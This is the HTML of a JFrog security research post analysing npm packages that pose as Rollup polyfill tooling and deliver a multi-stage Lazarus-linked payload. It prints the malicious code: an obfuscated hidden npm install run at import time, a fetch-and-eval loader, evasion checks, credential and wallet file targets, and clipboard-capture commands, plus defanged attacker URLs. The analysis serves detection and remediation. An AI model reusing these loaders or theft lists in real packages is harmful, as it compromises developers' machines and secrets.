@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html data-html-server-rendered="true" lang="en" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
+  <head>
+    <title>Lazarus-Linked npm Malware Masquerades as Rollup Polyfills - JFrog Security Research</title><meta name="gridsome:hash" content="a14a57e538f16293c6b748965f6e13332f9ff2cc"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="referrer" content="origin"><meta data-vue-tag="ssr" http-equiv="Content-Security-Policy" content="default-src *  &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27;  https://jfrog.com; img-src &#x27;self&#x27; * data: ; font-src &#x27;self&#x27; * data: ;"><meta data-vue-tag="ssr" name="title" content="Lazarus-Linked npm Malware Masquerades as Rollup Polyfills | JFrog"><meta data-vue-tag="ssr" name="description" content="JFrog Security Research identified malicious npm packages masquerading as Rollup polyfill tooling and leading to a multi-stage JavaScript payload."><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.ebe1c983be3d8af04d6186b36f13b87c.png"><link rel="preload" href="/assets/css/0.styles.63b6c696.css" as="style"><link rel="preload" href="/assets/js/app.679c50b3.js" as="script"><link rel="preload" href="/assets/js/page--src--templates--real-time-post-vue.1e9339a1.js" as="script"><link rel="prefetch" href="/assets/js/page--src--pages--404-vue.77816cba.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue.853ea674.js"><link rel="prefetch" href="/assets/js/page--src--pages--malicious-packages-vue.9729db36.js"><link rel="prefetch" href="/assets/js/page--src--pages--model-threats-vue.362fa315.js"><link rel="prefetch" href="/assets/js/page--src--pages--oss-vue.09abfdb0.js"><link rel="prefetch" href="/assets/js/page--src--pages--post-vue.ca82c3e8.js"><link rel="prefetch" href="/assets/js/page--src--pages--vulnerabilities-vue.6bf1a4e3.js"><link rel="prefetch" href="/assets/js/page--src--templates--model-threats-post-vue.5c3697db.js"><link rel="prefetch" href="/assets/js/page--src--templates--post-vue.ed40c9f8.js"><link rel="prefetch" href="/assets/js/vendors~page--src--pages--index-vue.c55f7205.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--model-threats-post-vue~page--src--templates--real-time-post-vue.585feee1.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--real-time-post-vue.c9d248c6.js"><link rel="stylesheet" href="/assets/css/0.styles.63b6c696.css"><script data-vue-tag="ssr" type="text/javascript">(function(){try{var k='theme',d=document.documentElement,m=window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches,s=localStorage.getItem(k),t=s==='dark'||s==='light'?s:(m?'dark':'light');d.classList.toggle('dark',t==='dark');}catch(e){}})();</script><script data-vue-tag="ssr" src="/speedsize-local.js"></script><script data-vue-tag="ssr" src="https://transcend-cdn.com/cm/f0071674-c641-4cf3-9d31-303ec0c86b1b/airgap.js" data-languages="en" data-tracker-overrides="GoogleConsentMode:security_storage=on;ad_storage=SaleOfInfo,Advertising;ad_user_data=SaleOfInfo,Advertising;ad_personalization=SaleOfInfo,Advertising;analytics_storage=Analytics,SaleOfInfo;functionality_storage=Functional,SaleOfInfo;personalization_storage=Functional,SaleOfInfo" data-cfasync="false" type="text/javascript" charset="utf-8"></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8">
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "GTM-T6MF8M");
+      gtag('set', 'developer_id.dODQ2Mj', true);
+    </script><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
+  </head>
+  <body >
+    <div data-server-rendered="true" id="app" class="layout min-h-screen bg-white dark:bg-gray-900 transition-colors duration-200"><header class="py-2 main-header dark:bg-gray-900"><div class="container mx-auto px-2"><div class="flex w-full justify-between items-center"><div class="left flex-1 min-w-0"><div class="flex min-w-0 items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a><span class="site-name small truncate dark:text-gray-200">JFrog Security Research</span></div></div><div class="right flex-shrink-0"><div class="hidden sm:block desktop-menu-wrapper"><ul class="top-menu flex items-center"><li class="menu-item"><a href="/model-threats/" class="font-bold px-3 dark:text-gray-200">
+      Model Threats
+    </a><a href="/vulnerabilities/" class="font-bold px-3 mx-3 dark:text-gray-200">
+      Discover
+    </a></li><li class="flex items-center mr-2"><button type="button" aria-pressed="false" aria-label="Toggle dark mode" title="Toggle dark mode" class="theme-toggle ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg></button></li><li><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noreferrer noopener noreferrer" class="sr-button px-3 py-2 inline-flex gap-2">
+  Follow JFrog Security
+  <img alt="twitter" src="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg" width="14" srcset="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg 14w" sizes="(max-width: 14px) 100vw, 14px" class="g-image"></a></li></ul></div><div class="sm:hidden flex mobile-menu-wrapper items-center"><!----><button type="button" aria-label="Open menu" aria-haspopup="dialog" aria-expanded="false" class="show-menu-hamburger ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="16" viewBox="0 0 22 16" fill="none" aria-hidden="true"><path d="M0 1C0 0.447715 0.447715 0 1 0H21C21.5523 0 22 0.447715 22 1C22 1.55228 21.5523 2 21 2H1C0.447716 2 0 1.55228 0 1Z" fill="currentColor"></path><path d="M0 8C0 7.44772 0.447715 7 1 7H21C21.5523 7 22 7.44772 22 8C22 8.55228 21.5523 9 21 9H1C0.447716 9 0 8.55228 0 8Z" fill="currentColor"></path><path d="M0 15C0 14.4477 0.447715 14 1 14H21C21.5523 14 22 14.4477 22 15C22 15.5523 21.5523 16 21 16H1C0.447716 16 0 15.5523 0 15Z" fill="currentColor"></path></svg></button></div></div></div></div><div class="fixed mobile-menu h-screen w-screen z-50 bg-white dark:bg-gray-900 text-gray-700 dark:text-gray-200 p-5 inset-0" style="display:none;"><div class="flex items-center justify-between gap-4 mb-3 pb-3 border-b border-gray-200 dark:border-gray-700"><div class="flex items-center gap-3"><span class="text-xs font-bold uppercase tracking-wide text-gray-500 dark:text-gray-400">Theme</span><button type="button" aria-pressed="false" aria-label="Toggle dark mode" title="Toggle dark mode" class="theme-toggle ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg></button></div><button type="button" aria-label="Close menu" class="ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 12" fill="none" aria-hidden="true"><path d="M1 1L11 11" stroke="currentColor" stroke-width="2"></path><path d="M11 1L1 11" stroke="currentColor" stroke-width="2"></path></svg></button></div><ul class="mobile-menu-list"><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/" class="text-gray-700 dark:text-gray-200 active">
+        Home
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/model-threats/" class="text-gray-700 dark:text-gray-200">
+        Model Threats
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/vulnerabilities/" class="text-gray-700 dark:text-gray-200">
+        Discover
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noopener noreferrer" class="text-gray-700 dark:text-gray-200">
+        Follow JFrog Security
+      </a></li></ul></div></header><main><div class="latest-posts"><div class="container pt-5 pb-10"><h1 class="mt-3 pb-0">Lazarus-Linked npm Malware Masquerades as Rollup Polyfills</h1><p class="mt-1 mb-5 green">Yair Benamou, JFrog Security Researcher | 30 Jun, 2026</p><div class="post-content-wrapper real-time-theme"><section class="latest-posts-single-post-content text-black dark:text-gray-200"><p>The JFrog Security research team identified a malicious npm package cluster masquerading as Rollup polyfill tooling. The two entry packages, <code>rollup-packages-polyfill-core</code> and <code>rollup-runtime-polyfill-core</code>, imitate the naming, README content, repository metadata, and package shape of the legitimate <a href="https://www.npmjs.com/package/rollup-plugin-polyfill-node" target="_blank" rel="nofollow noopener noreferrer"><code>rollup-plugin-polyfill-node</code></a> project.</p>
+<p><img src="/img/RealTimePostImage/post/rollup-polyfill-masquerading-hero.png"></p>
+<p>The legitimate package is widely used in the JavaScript build ecosystem, with <strong>~295K weekly downloads</strong> for <code>rollup-plugin-polyfill-node</code> and more than <strong>1.2M downloads in the last month</strong>. The lookalike packages place themselves in the same <code>rollup</code>, <code>polyfill</code>, <code>core</code>, and <code>node</code> naming space, which can look plausible during a quick dependency review.</p>
+<h2 id="affected-packages"><a href="#affected-packages" aria-hidden="true" tabindex="-1">Affected Packages</a></h2>
+<p>During the investigation, we observed six npm packages:</p>
+<pre><code class="language-text">rollup-packages-polyfill-core
+rollup-runtime-polyfill-core
+swift-parse-stream
+quirky-token
+react-icon-svgs
+rollup-plugin-polyfill-connect
+</code></pre>
+<p>At the time of writing, <code>rollup-plugin-polyfill-connect</code> and <code>react-icon-svgs</code> had received security-holding versions on npm, while the other four malicious packages were still live.</p>
+<p>The first two packages are the Rollup-themed entry points. <code>rollup-packages-polyfill-core</code> installs and loads <code>swift-parse-stream</code>; <code>rollup-runtime-polyfill-core</code> installs and loads <code>quirky-token</code>. The second-stage packages are near-identical SVG utilities that fetch a JSON object from JSONKeeper and <code>eval</code> the <code>model</code> field.</p>
+<p>We observed the same staging pattern with <code>react-icon-svgs</code>, which installed <code>rollup-plugin-polyfill-connect</code> as a second stage. This layered structure, together with the lookalike names, legitimate-looking metadata, hidden install-time execution, environment checks, and credential-theft/remote-access payloads, is similar to previous North Korean Lazarus-linked npm campaigns. The key differentiator is the payload deployment method, which we analyze in detail below.</p>
+<h2 id="package-masquerading"><a href="#package-masquerading" aria-hidden="true" tabindex="-1">Package Masquerading</a></h2>
+<p>Both Rollup-themed packages copy most of the legitimate <code>rollup-plugin-polyfill-node</code> surface:</p>
+<ul>
+<li>The README text describes "A modern Node.js polyfill for your Rollup bundle." <img src="/img/RealTimePostImage/post/rollup-polyfill-masquerading-npm.png"></li>
+<li>The repository and homepage point to <code>https://github.com/FredKSchott/rollup-plugin-polyfill-node</code>.</li>
+<li>The package entry point contains legitimate-looking Rollup polyfill plugin code before the malicious logic.</li>
+<li>In the samples, only the CommonJS <code>dist/index.js</code> entry point is backdoored; the ESM <code>dist/es/index.js</code> files do not contain the appended install-and-load routine.</li>
+<li>The names remain close to the legitimate project without being exact typos.</li>
+</ul>
+<h2 id="end-to-end-malware-flow"><a href="#end-to-end-malware-flow" aria-hidden="true" tabindex="-1">End-to-End Malware Flow</a></h2>
+<p>Putting the pieces together, the infection chain looks like this:</p>
+<p><img src="/img/RealTimePostImage/post/polyfill-masquerading-flow.png"></p>
+<p>The two entry packages differ mainly in the second-stage package they install. After that, both routes converge on the same JSONKeeper payload.</p>
+<h2 id="hidden-install-step"><a href="#hidden-install-step" aria-hidden="true" tabindex="-1">Hidden Install Step</a></h2>
+<p>The malicious logic is appended to otherwise plausible Rollup plugin code. In <code>rollup-packages-polyfill-core</code>, the import-time install routine is hidden behind benign-looking SVG validation names:</p>
+<pre><code class="language-js">const ValidateSvgModule = () => {
+  const CMD = Buffer.from("bnBtIGluc3RhbGwgc3dpZnQtcGFyc2Utc3RyZWFtIC0tbm8tc2F2ZSAtLXNpbGVudCAtLW5vLWF1ZGl0IC0tbm8tZnVuZA==", "base64").toString("utf8");
+  const [cmd, ...args] = CMD.split(' ');
+  const child = spawn(cmd, args, {
+    stdio: 'ignore',
+    shell: process.platform === 'win32',
+    windowsHide: true
+  });
+};
+</code></pre>
+<p>The base64 string in <code>CMD</code> decodes to:</p>
+<pre><code class="language-text">npm install swift-parse-stream --no-save --silent --no-audit --no-fund
+</code></pre>
+<p>The package then decodes the module name <code>swift-parse-stream</code>, requires it, retrieves <code>getPlugin()</code>, and invokes the returned function.</p>
+<pre><code class="language-js">const MODULE_NAME = Buffer.from('c3dpZnQtcGFyc2Utc3RyZWFt', 'base64').toString('utf8');
+const checkPlugin = () => {
+  try {
+    const svgo = require(MODULE_NAME);
+    const plugin = svgo.getPlugin();
+    if (plugin) {
+      const svgData = '';
+      plugin();
+    }
+  } catch (error) {
+  }
+};
+ValidateSvgModule();
+</code></pre>
+<p><code>rollup-runtime-polyfill-core</code> uses the same pattern to install <code>quirky-token</code>.</p>
+<p>This makes the infection happen when the package is imported as part of a build or configuration flow.</p>
+<h2 id="jsonkeeper-loader"><a href="#jsonkeeper-loader" aria-hidden="true" tabindex="-1">JSONKeeper Loader</a></h2>
+<p><code>swift-parse-stream</code> and <code>quirky-token</code> present themselves as SVG sanitization utilities. Most of the file is harmless-looking SVG code: hashing content, removing <code>&#x3C;script></code> tags, minifying SVG text, and saving files.</p>
+<p>The real behavior appears at the end of <code>index.js</code>:</p>
+<pre><code class="language-js">const reqOptions = {
+  url: "hxxps://www[.]jsonkeeper[.]com/b/3P9BF",
+  headers: {
+    bearrtoken: "logo"
+  }
+};
+
+function getPlugin() {
+  return function() {
+    request(reqOptions, (err, res, body) => {
+      if (err || res.statusCode !== 200) {
+      }
+
+      try {
+        const parsed = JSON.parse(body);
+        if (typeof parsed.model === "string") {
+          eval(parsed.model);
+        }
+      } catch (e) {
+      }
+    });
+  };
+}
+</code></pre>
+<p>The JSONKeeper object contains a key named <code>model</code>, which contains an obfuscated JavaScript payload that is executed directly through <code>eval</code>.</p>
+<p><img src="/img/RealTimePostImage/post/polyfill-masquerading-code.png"></p>
+<h2 id="jsonkeeper-payload"><a href="#jsonkeeper-payload" aria-hidden="true" tabindex="-1">JSONKeeper Payload</a></h2>
+<p>The JSONKeeper payload starts with environment checks. It exits in several hosted or cloud-like environments, including:</p>
+<pre><code class="language-text">CODESPACE_NAME
+CODESANDBOX_HOST
+VERCEL
+AWS_EXECUTION_ENV
+AWS_REGION
+AWS_LAMBDA_FUNCTION_NAME
+AWS_ACCESS_KEY_ID
+GOOGLE_CLOUD_PROJECT
+AZURE_FUNCTIONS_ENVIRONMENT
+DOCKER
+RENDER
+GAE_ENV
+WEBSITE_SITE_NAME
+DYNO
+SOCKET_DEV
+</code></pre>
+<p>It also checks whether the OS release string contains <code>aws</code>. This looks like an attempt to avoid common sandboxes, cloud development environments, serverless runtimes, and analysis infrastructure.</p>
+<p>After the environment gate, the payload installs dependencies and downloads the next stage:</p>
+<pre><code class="language-text">npm install axios socket.io-client --no-warnings --no-progress --loglevel silent
+</code></pre>
+<p>It then requests:</p>
+<pre><code class="language-text">hxxp[:]//216[.]126[.]236[.]244/api/service/98cb54c0b4ac259d30c9c1ca1ae87c68
+</code></pre>
+<p>The response is formatted as <code>&#x3C;base64 IV>:&#x3C;base64 ciphertext></code> and the payload derives an AES key with:</p>
+<pre><code class="language-js">crypto.scryptSync("98cb54c0b4ac259d30c9c1ca1ae87c68", "salt", 32)
+</code></pre>
+<p>It decrypts the ciphertext with <code>AES-256-CBC</code>, writes the plaintext to <code>&#x3C;tmp>/pack</code>, and executes <code>node pack</code>.</p>
+<p>During our analysis, the remote service was still live and we managed to retrieve the AES-wrapped JavaScript payload of roughly <strong>114 KB</strong> after decryption.</p>
+<h2 id="remote-pack-stage"><a href="#remote-pack-stage" aria-hidden="true" tabindex="-1">Remote Pack Stage</a></h2>
+<p>The decrypted <code>pack</code> stage is a loader for multiple JavaScript payloads. In a sandboxed run with file writes, network connections, and command execution stubbed out, it attempted to write and launch additional scripts under the temp directory:</p>
+<pre><code class="language-text">&#x3C;tmp>/scdata
+&#x3C;tmp>/ldata
+</code></pre>
+<p>It also spawned payloads for file collection and clipboard monitoring, which were embedded inside a JSON file:</p>
+<pre><code class="language-js">...
+    {
+      "method": "exec",
+      "command": "npm i axios &#x26;&#x26; node ldata",
+      "options": {
+        "cwd": "/tmp",
+        "windowsHide": true,
+        "stdio": "ignore"
+      }
+    },
+    {
+      "method": "spawn",
+      "command": "node",
+      "argv": [
+        "-e",
+        "const m=b;function b(c,d){c=c-(0x9fa*0x1+-0x16e2*-0x1+-0x1ef3);const e=a();let f=e[c];return f;}(function(c,d){const......
+</code></pre>
+<p>The parent launcher starts the dropped scripts with:</p>
+<pre><code class="language-text">npm i axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent &#x26;&#x26; node scdata
+npm i axios &#x26;&#x26; node ldata
+</code></pre>
+<p>The recovered behavior splits into four main parts:</p>
+<ul>
+<li><code>scdata.js</code>: remote access and host-control component</li>
+<li><code>ldata.js</code>: browser and crypto-wallet data collection component</li>
+<li><code>events.json</code> file collector: broad filesystem discovery and upload</li>
+<li><code>events.json</code> clipboard watcher: periodic clipboard collection</li>
+</ul>
+<h2 id="remote-access-component"><a href="#remote-access-component" aria-hidden="true" tabindex="-1">Remote Access Component</a></h2>
+<p>The <code>scdata</code> payload installs several runtime dependencies:</p>
+<pre><code class="language-text">npm install socket.io-client ssh2 node-pty@1.0.0 --no-warnings --no-progress --loglevel silent
+npm install socket.io-client ssh2 node-pty --no-warnings --no-progress --loglevel silent
+npm install sharp screenshot-desktop clipboardy @nut-tree-fork/nut-js --no-warnings --no-progress --loglevel silent
+npm install -g socket.io-client --save --no-warnings --no-save --no-progress --loglevel silent
+</code></pre>
+<p>The unversioned <code>node-pty</code> path and the screen/input packages are Windows-specific. The global <code>socket.io-client</code> install is used as a fallback if the first Socket.IO setup path fails.</p>
+<p>The payload uses Socket.IO to communicate with:</p>
+<pre><code class="language-text">hxxp[:]//216[.]126[.]236[.]244:4801
+</code></pre>
+<p>It also posts host and log information to endpoints under:</p>
+<pre><code class="language-text">hxxp[:]//216[.]126[.]236[.]244/api/service/
+</code></pre>
+<p>The remote access component supports:</p>
+<ul>
+<li>host profiling with OS, release, hostname, user info, UID, and VM markers</li>
+<li>VM checks through Windows CIM, macOS <code>system_profiler</code>, Linux <code>/proc/cpuinfo</code>, and strings such as <code>vmware</code>, <code>virtualbox</code>, <code>qemu</code>, and <code>microsoft corporation</code></li>
+<li>command execution through <code>child_process.exec</code></li>
+<li>interactive terminal sessions through <code>node-pty</code>, using <code>powershell.exe</code> on Windows and <code>zsh</code> elsewhere</li>
+<li>SSH sessions through the <code>ssh2</code> library</li>
+<li>terminal resize and terminal input forwarding</li>
+<li>Windows-only screenshot capture through <code>screenshot-desktop</code> and JPEG conversion through <code>sharp</code></li>
+<li>Windows-only mouse movement, clicks, scrolling, keyboard presses, and hotkeys through <code>@nut-tree-fork/nut-js</code></li>
+<li>Windows-only remote clipboard read and paste handling through <code>clipboardy</code></li>
+<li>process termination and single-instance tracking under a temp <code>.npm</code> directory, with a <code>vhost.ctl</code> process/PID marker</li>
+</ul>
+<p>This component gives the operator interactive control over the infected host, not just one-time data theft.</p>
+<h2 id="browser-and-wallet-data-collection"><a href="#browser-and-wallet-data-collection" aria-hidden="true" tabindex="-1">Browser And Wallet Data Collection</a></h2>
+<p>The <code>ldata</code> payload targets browser profile data and crypto-wallet extension storage. It posts uploads to:</p>
+<pre><code class="language-text">hxxp[:]//216[.]126[.]236[.]244:4809/upload
+hxxp[:]//216[.]126[.]236[.]244:4809/cldbs
+</code></pre>
+<p>The payload checks common browser profile locations for Windows, macOS, and Linux, including Chrome, Edge, Brave, Opera, and LT Browser. It attempts to upload files such as:</p>
+<pre><code class="language-text">Login Data
+Login Data For Account
+Web Data
+Local Extension Settings/&#x3C;extension-id>/*
+</code></pre>
+<p>On macOS, it also attempts to upload:</p>
+<pre><code class="language-text">~/Library/Keychains/login.keychain-db
+</code></pre>
+<p>The extension ID list includes widely used wallet and browser-extension storage locations. Recovered IDs include known wallets such as MetaMask:</p>
+<pre><code class="language-text">nkbihfbeogaeaoehlefnkodbefgpgknn
+bfnaelmomeimhlpmgjnjophhpkkoljpa
+fhbohimaelbohpjbbldcngcnapndodjp
+</code></pre>
+<p>The collection logic copies extension storage into a temporary directory before upload, and it repeatedly checks some LevelDB paths until the server acknowledges them.</p>
+<h2 id="broad-file-collection"><a href="#broad-file-collection" aria-hidden="true" tabindex="-1">Broad File Collection</a></h2>
+<p>One inline <code>node -e</code> payload performs broad filesystem collection and uploads matching files to:</p>
+<pre><code class="language-text">hxxp[:]//216[.]126[.]236[.]244:4806/upload
+</code></pre>
+<p>It recursively scans user directories while excluding common noisy or system directories such as <code>node_modules</code>, caches, build output, package directories, app bundles, and OS folders. The deobfuscated collector handles <code>.git</code> specially: it skips the repository tree but uploads <code>.git/config</code> when present. It also contains platform-specific expansion logic: Windows logical disks are enumerated with <code>Get-CimInstance Win32_LogicalDisk</code>, Linux scans include <code>/mnt</code>, and macOS scans include <code>~/Library/Application Support</code>.</p>
+<p>The collector specifically looks for editor history under:</p>
+<pre><code class="language-text">Code/User/History
+Windsurf/User/History
+Cursor/User/History
+</code></pre>
+<p>The filename and keyword targeting is broad. Recovered patterns include:</p>
+<pre><code class="language-text">*.env*
+*.pem
+*.key
+*.secret
+*private key*
+*secret phrase*
+*metamask*
+*bitcoin*
+*btc*
+*solana*
+*.json
+*.txt
+*.csv
+*.doc
+*.docx
+*.xls
+*.xlsx
+*.pdf
+*.png
+*.jpg
+*.jpeg
+*.md
+*.rtf
+*.odt
+*.ini
+*.ts
+*.js
+</code></pre>
+<p>It also includes common developer and AI-tool configuration locations such as:</p>
+<pre><code class="language-text">.aws
+.azure
+.ssh
+.gnupg
+.config
+.foundry
+.vscode
+.cursor
+.windsurf
+.gemini
+.claude
+.bash_history
+.zsh_history
+</code></pre>
+<p>This makes the payload relevant to developer workstations and build machines, where API keys, SSH keys, wallet material, cloud credentials, and project secrets are often present.</p>
+<h2 id="clipboard-monitoring"><a href="#clipboard-monitoring" aria-hidden="true" tabindex="-1">Clipboard Monitoring</a></h2>
+<p>Another inline payload monitors clipboard contents. It uses:</p>
+<pre><code class="language-text">pbpaste
+powershell -NoProfile -NonInteractive Get-Clipboard
+</code></pre>
+<p>When the clipboard changes, the payload sends the new value to:</p>
+<pre><code class="language-text">hxxp[:]//216[.]126[.]236[.]244/api/service/makelog
+</code></pre>
+<p>Clipboard monitoring is a common way to capture copied credentials, tokens, wallet addresses, seed phrases, and one-time secrets.</p>
+<h2 id="the-risks"><a href="#the-risks" aria-hidden="true" tabindex="-1">The Risks</a></h2>
+<p>The risk is significant because the compromise sits inside build tooling. Rollup plugins are commonly loaded from local configuration files, developer workstations, and CI jobs. These environments often have access to sensitive assets such as source code, npm tokens, Git credentials, cloud keys, SSH keys, browser data, and project secrets.</p>
+<p>The payload is also broader than a simple downloader. Once the later stages run, the attacker gains both collection and control capabilities. One payload collects browser and wallet data, another searches the filesystem for secrets, another monitors the clipboard, and the remote access component can run commands, open terminals, start SSH sessions, capture screenshots, and control input devices.</p>
+<h2 id="detection-and-remediation"><a href="#detection-and-remediation" aria-hidden="true" tabindex="-1">Detection And Remediation</a></h2>
+<p>Recommended actions for users who installed any of these malicious packages:</p>
+<ul>
+<li>Remove <code>rollup-packages-polyfill-core</code>, <code>rollup-runtime-polyfill-core</code>, <code>swift-parse-stream</code>, <code>quirky-token</code>, <code>react-icon-svgs</code>, and <code>rollup-plugin-polyfill-connect</code> from affected projects and lockfiles.</li>
+<li>Inspect dependency trees for transitive pulls of <code>swift-parse-stream</code>, <code>quirky-token</code>, or <code>rollup-plugin-polyfill-connect</code>.</li>
+<li>Search developer machines and CI runners for <code>pack</code>, <code>scdata</code>, and <code>ldata</code> under temporary directories.</li>
+<li>Search for command lines containing <code>node pack</code>, <code>node scdata</code>, <code>node ldata</code>, or inline <code>node -e</code> scripts connecting to <code>216.126.236.244</code>.</li>
+<li>Block outbound communication to <code>216.126.236.244</code> and the JSONKeeper URL listed below.</li>
+<li>Treat affected machines as potentially compromised before rotating credentials.</li>
+<li>Rotate npm, GitHub, cloud, SSH, package-registry, browser-stored, and wallet-related credentials after persistence and active processes are removed.</li>
+<li>Audit browsers for unexpected extension storage access and inspect developer configuration directories for data exposure.</li>
+</ul>
+<h2 id="conclusion"><a href="#conclusion" aria-hidden="true" tabindex="-1">Conclusion</a></h2>
+<p>This campaign is effective because each layer appears ordinary when viewed on its own. The entry package looks like Rollup polyfill infrastructure. The second-stage package looks like an SVG utility. The JSONKeeper response appears to be structured data. Only after following the full chain does the real behavior become clear: remote access, browser and wallet theft, file collection, and clipboard monitoring.</p>
+<p>Lookalike build dependencies deserve careful review even when the name is not an obvious typo. A copied README, a trusted repository link, and functional-looking package code can be enough to hide a serious compromise.</p>
+<p>These malicious packages are detected by JFrog Xray and JFrog Curation.</p>
+<h2 id="iocs"><a href="#iocs" aria-hidden="true" tabindex="-1">IOCs</a></h2>
+<h3 id="package-iocs"><a href="#package-iocs" aria-hidden="true" tabindex="-1">Package IOCs</a></h3>
+<table>
+<thead>
+<tr>
+<th align="left">Package</th>
+<th align="left">Type</th>
+<th align="left">Xray ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left"><code>rollup-packages-polyfill-core</code></td>
+<td align="left">npm</td>
+<td align="left">XRAY-1008625</td>
+</tr>
+<tr>
+<td align="left"><code>rollup-runtime-polyfill-core</code></td>
+<td align="left">npm</td>
+<td align="left">XRAY-1008531</td>
+</tr>
+<tr>
+<td align="left"><code>swift-parse-stream</code></td>
+<td align="left">npm</td>
+<td align="left">XRAY-1005725</td>
+</tr>
+<tr>
+<td align="left"><code>quirky-token</code></td>
+<td align="left">npm</td>
+<td align="left">XRAY-1003392</td>
+</tr>
+<tr>
+<td align="left"><code>rollup-plugin-polyfill-connect</code></td>
+<td align="left">npm</td>
+<td align="left">XRAY-973019</td>
+</tr>
+<tr>
+<td align="left"><code>react-icon-svgs</code></td>
+<td align="left">npm</td>
+<td align="left">XRAY-1011624</td>
+</tr>
+</tbody>
+</table>
+<h3 id="network-indicators"><a href="#network-indicators" aria-hidden="true" tabindex="-1">Network Indicators</a></h3>
+<pre><code class="language-text">hxxps[:]//www[.]jsonkeeper[.]com/b/3P9BF
+hxxp[:]//216[.]126[.]236[.]244/api/service/98cb54c0b4ac259d30c9c1ca1ae87c68
+hxxp[:]//216[.]126[.]236[.]244/api/service/makelog
+hxxp[:]//216[.]126[.]236[.]244/api/service/process/
+hxxp[:]//216[.]126[.]236[.]244:4801
+hxxp[:]//216[.]126[.]236[.]244:4806/upload
+hxxp[:]//216[.]126[.]236[.]244:4809/upload
+hxxp[:]//216[.]126[.]236[.]244:4809/cldbs
+</code></pre>
+<h3 id="host-indicators"><a href="#host-indicators" aria-hidden="true" tabindex="-1">Host Indicators</a></h3>
+<pre><code class="language-text">&#x3C;tmp>/scdata
+&#x3C;tmp>/ldata
+node pack
+node scdata
+node ldata
+vhost.ctl
+</code></pre>
+<h3 id="command-and-behavior-indicators"><a href="#command-and-behavior-indicators" aria-hidden="true" tabindex="-1">Command And Behavior Indicators</a></h3>
+<pre><code class="language-text">npm install swift-parse-stream --no-save --silent --no-audit --no-fund
+npm install quirky-token --no-save --silent --no-audit --no-fund
+npm install axios socket.io-client --no-warnings --no-progress --loglevel silent
+npm i axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent
+npm i axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent &#x26;&#x26; node scdata
+npm i axios &#x26;&#x26; node ldata
+npm install socket.io-client ssh2 node-pty@1.0.0 --no-warnings --no-progress --loglevel silent
+npm install socket.io-client ssh2 node-pty --no-warnings --no-progress --loglevel silent
+npm install -g socket.io-client --save --no-warnings --no-save --no-progress --loglevel silent
+npm install sharp screenshot-desktop clipboardy @nut-tree-fork/nut-js --no-warnings --no-progress --loglevel silent
+pbpaste
+powershell -NoProfile -NonInteractive Get-Clipboard
